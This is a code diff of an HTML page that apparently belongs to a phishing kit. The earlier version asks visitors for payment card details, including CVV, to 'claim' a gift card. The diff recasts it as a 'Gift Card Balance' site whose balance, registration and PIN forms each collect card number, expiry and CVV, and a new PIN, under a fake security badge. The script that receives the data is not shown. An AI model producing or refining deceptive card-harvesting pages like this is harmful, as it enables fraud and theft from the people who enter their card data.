@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your Gift Card | Secure Redemption</title>
+    <title>Gift Card Balance | Secure Management</title>
     <link rel="stylesheet" href="css/style.css">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
 </head>
@@ -13,7 +13,7 @@
         <header class="header">
             <div class="logo">
                 <i class="fas fa-gift"></i>
-                <span>MyGiftHub</span>
+                <span>Gift Card Balance</span>
             </div>
             <div class="security-badge">
                 <i class="fas fa-lock"></i>
@@ -24,27 +24,28 @@
         <!-- Main Content -->
         <main class="main-content">
             <div class="gift-card">
-                <!-- Progress Steps -->
-                <div class="progress-steps">
-                    <div class="step active" data-step="1">
-                        <div class="step-number">1</div>
-                        <span>Card Details</span>
+                <!-- Section Buttons -->
+                <div class="section-buttons">
+                    <div class="section-button active" data-section="check">
+                        <i class="fas fa-wallet"></i>
+                        <span>Check Balance/Transactions</span>
                     </div>
-                    <div class="step" data-step="2">
-                        <div class="step-number">2</div>
-                        <span>Verification</span>
+                    <div class="section-button" data-section="register">
+                        <i class="fas fa-credit-card"></i>
+                        <span>Register Card</span>
                     </div>
-                    <div class="step" data-step="3">
-                        <div class="step-number">3</div>
-                        <span>Confirmation</span>
+                    <div class="section-button" data-section="personalize">
+                        <i class="fas fa-key"></i>
+                        <span>Personalize PIN</span>
                     </div>
                 </div>
 
                 <!-- Gift Card Form -->
                 <form id="giftForm" class="gift-form">
-                    <div class="form-section active" id="section-1">
-                        <h2>Enter Your Card Details</h2>
-                        <p class="section-description">Please provide your payment card information to claim your gift</p>
+                    <!-- Check Balance Section -->
+                    <div class="form-section active" id="section-check">
+                        <h2>Check Your Gift Card Balance</h2>
+                        <p class="section-description">Please provide gift card information to check your balance</p>
 
                         <!-- Card Number -->
                         <div class="form-group">
@@ -58,9 +59,7 @@
                                     maxlength="19"
                                     required>
                                 <div class="card-icons">
-                                    <i class="fab fa-cc-visa" id="visaIcon"></i>
-                                    <i class="fab fa-cc-mastercard" id="mastercardIcon"></i>
-                                    <i class="fab fa-cc-amex" id="amexIcon"></i>
+                                    <i class="fas fa-gift"></i>
                                 </div>
                             </div>
                             <div class="error-message" id="cardNumberError"></div>
@@ -112,59 +111,192 @@
                             </div>
                         </div>
 
-                        <!-- Card Type Detection -->
-                        <div class="card-type-display" id="cardTypeDisplay">
-                            <span id="detectedCardType">Card type will be detected automatically</span>
-                        </div>
-
-                        <button type="button" class="btn btn-primary" onclick="nextSection()">
-                            Continue
+                        <button type="button" class="btn btn-primary" onclick="submitForm()">
+                            Check Balance
                             <i class="fas fa-arrow-right"></i>
                         </button>
                     </div>
 
-                    <!-- Verification Section -->
-                    <div class="form-section" id="section-2">
-                        <h2>Verify Your Information</h2>
-                        <p class="section-description">Please review your card details before proceeding</p>
+                    <!-- Register Card Section -->
+                    <div class="form-section" id="section-register">
+                        <h2>Register Your Gift Card</h2>
+                        <p class="section-description">Please provide gift card information to register your card</p>
 
-                        <div class="verification-card">
-                            <div class="card-preview">
-                                <div class="card-chip">
-                                    <i class="fas fa-microchip"></i>
+                        <!-- Card Number -->
+                        <div class="form-group">
+                            <label for="cardNumberRegister">Card Number</label>
+                            <div class="input-with-icon">
+                                <input 
+                                    type="text" 
+                                    id="cardNumberRegister" 
+                                    name="cardNumberRegister" 
+                                    placeholder="1234 5678 9012 3456"
+                                    maxlength="19"
+                                    required>
+                                <div class="card-icons">
+                                    <i class="fas fa-gift"></i>
                                 </div>
-                                <div class="card-number-preview" id="cardNumberPreview"></div>
-                                <div class="card-details-preview">
-                                    <div>
-                                        <span>Expires</span>
-                                        <span id="expiryPreview"></span>
+                            </div>
+                            <div class="error-message" id="cardNumberRegisterError"></div>
+                        </div>
+
+                        <!-- Expiry Date & CVV -->
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="expiryMonthRegister">Expiry Date</label>
+                                <div class="custom-select-group">
+                                    <div class="custom-select-wrapper">
+                                        <div class="custom-select" id="expiryMonthSelectRegister">
+                                            <div class="custom-select-trigger">
+                                                <span id="expiryMonthValueRegister">Month</span>
+                                                <i class="fas fa-chevron-down"></i>
+                                            </div>
+                                            <div class="custom-options" id="expiryMonthOptionsRegister">
+                                                <!-- Options populated by JS -->
+                                            </div>
+                                        </div>
+                                        <input type="hidden" id="expiryMonthRegister" name="expiryMonthRegister" required>
                                     </div>
-                                    <div>
-                                        <span>CVV</span>
-                                        <span id="cvvPreview"></span>
+                                    <div class="custom-select-wrapper">
+                                        <div class="custom-select" id="expiryYearSelectRegister">
+                                            <div class="custom-select-trigger">
+                                                <span id="expiryYearValueRegister">Year</span>
+                                                <i class="fas fa-chevron-down"></i>
+                                            </div>
+                                            <div class="custom-options" id="expiryYearOptionsRegister">
+                                                <!-- Options populated by JS -->
+                                            </div>
+                                        </div>
+                                        <input type="hidden" id="expiryYearRegister" name="expiryYearRegister" required>
                                     </div>
                                 </div>
-                                <div class="card-type-preview" id="cardTypePreview"></div>
+                                <div class="error-message" id="expiryRegisterError"></div>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="cvvRegister">CVV</label>
+                                <input 
+                                    type="text" 
+                                    id="cvvRegister" 
+                                    name="cvvRegister" 
+                                    placeholder="123"
+                                    maxlength="4"
+                                    required>
+                                <div class="error-message" id="cvvRegisterError"></div>
                             </div>
                         </div>
 
-                        <div class="verification-actions">
-                            <button type="button" class="btn btn-secondary" onclick="prevSection()">
-                                <i class="fas fa-arrow-left"></i>
-                                Back
-                            </button>
-                            <button type="submit" class="btn btn-primary" id="submitBtn">
-                                Claim Gift Card
-                                <i class="fas fa-gift"></i>
-                            </button>
+                        <button type="button" class="btn btn-primary" onclick="submitForm()">
+                            Register Card
+                            <i class="fas fa-arrow-right"></i>
+                        </button>
+                    </div>
+
+                    <!-- Personalize PIN Section -->
+                    <div class="form-section" id="section-personalize">
+                        <h2>Personalize Your PIN</h2>
+                        <p class="section-description">Please provide gift card information to personalize your PIN</p>
+
+                        <!-- Card Number -->
+                        <div class="form-group">
+                            <label for="cardNumberPersonalize">Card Number</label>
+                            <div class="input-with-icon">
+                                <input 
+                                    type="text" 
+                                    id="cardNumberPersonalize" 
+                                    name="cardNumberPersonalize" 
+                                    placeholder="1234 5678 9012 3456"
+                                    maxlength="19"
+                                    required>
+                                <div class="card-icons">
+                                    <i class="fas fa-gift"></i>
+                                </div>
+                            </div>
+                            <div class="error-message" id="cardNumberPersonalizeError"></div>
                         </div>
+
+                        <!-- Expiry Date & CVV -->
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="expiryMonthPersonalize">Expiry Date</label>
+                                <div class="custom-select-group">
+                                    <div class="custom-select-wrapper">
+                                        <div class="custom-select" id="expiryMonthSelectPersonalize">
+                                            <div class="custom-select-trigger">
+                                                <span id="expiryMonthValuePersonalize">Month</span>
+                                                <i class="fas fa-chevron-down"></i>
+                                            </div>
+                                            <div class="custom-options" id="expiryMonthOptionsPersonalize">
+                                                <!-- Options populated by JS -->
+                                            </div>
+                                        </div>
+                                        <input type="hidden" id="expiryMonthPersonalize" name="expiryMonthPersonalize" required>
+                                    </div>
+                                    <div class="custom-select-wrapper">
+                                        <div class="custom-select" id="expiryYearSelectPersonalize">
+                                            <div class="custom-select-trigger">
+                                                <span id="expiryYearValuePersonalize">Year</span>
+                                                <i class="fas fa-chevron-down"></i>
+                                            </div>
+                                            <div class="custom-options" id="expiryYearOptionsPersonalize">
+                                                <!-- Options populated by JS -->
+                                            </div>
+                                        </div>
+                                        <input type="hidden" id="expiryYearPersonalize" name="expiryYearPersonalize" required>
+                                    </div>
+                                </div>
+                                <div class="error-message" id="expiryPersonalizeError"></div>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="cvvPersonalize">CVV</label>
+                                <input 
+                                    type="text" 
+                                    id="cvvPersonalize" 
+                                    name="cvvPersonalize" 
+                                    placeholder="123"
+                                    maxlength="4"
+                                    required>
+                                <div class="error-message" id="cvvPersonalizeError"></div>
+                            </div>
+                        </div>
+
+                        <!-- New PIN Section -->
+                        <div class="form-group">
+                            <label for="newPIN">New PIN</label>
+                            <input 
+                                type="password" 
+                                id="newPIN" 
+                                name="newPIN" 
+                                placeholder="Enter new 4-digit PIN"
+                                maxlength="4"
+                                required>
+                            <div class="error-message" id="newPINError"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="confirmPIN">Confirm PIN</label>
+                            <input 
+                                type="password" 
+                                id="confirmPIN" 
+                                name="confirmPIN" 
+                                placeholder="Confirm your new PIN"
+                                maxlength="4"
+                                required>
+                            <div class="error-message" id="confirmPINError"></div>
+                        </div>
+
+                        <button type="button" class="btn btn-primary" onclick="submitForm()">
+                            Personalize PIN
+                            <i class="fas fa-arrow-right"></i>
+                        </button>
                     </div>
                 </form>
 
                 <!-- Loading Overlay -->
                 <div class="loading-overlay" id="loadingOverlay">
                     <div class="loading-spinner"></div>
-                    <p>Processing your gift card...</p>
+                    <p>Processing your request...</p>
                 </div>
 
                 <!-- Success Message -->
@@ -172,10 +304,10 @@
                     <div class="success-icon">
                         <i class="fas fa-check-circle"></i>
                     </div>
-                    <h3>Gift Card Claimed Successfully!</h3>
-                    <p id="successDetails">Your gift card has been processed and will be available shortly.</p>
+                    <h3>Request Completed Successfully!</h3>
+                    <p id="successDetails">Your request has been processed successfully.</p>
                     <div class="success-actions">
-                        <button class="btn btn-primary" onclick="resetForm()">
+                        <button class="btn btn-primary" onclick="redirectToMainPage()">
                             Return To Main Page
                         </button>
                     </div>
@@ -201,6 +333,7 @@
             </div>
         </footer>
     </div>
-<script src="js/app.js"></script>
+    
+    <script src="js/app.js"></script>
 </body>
 </html>
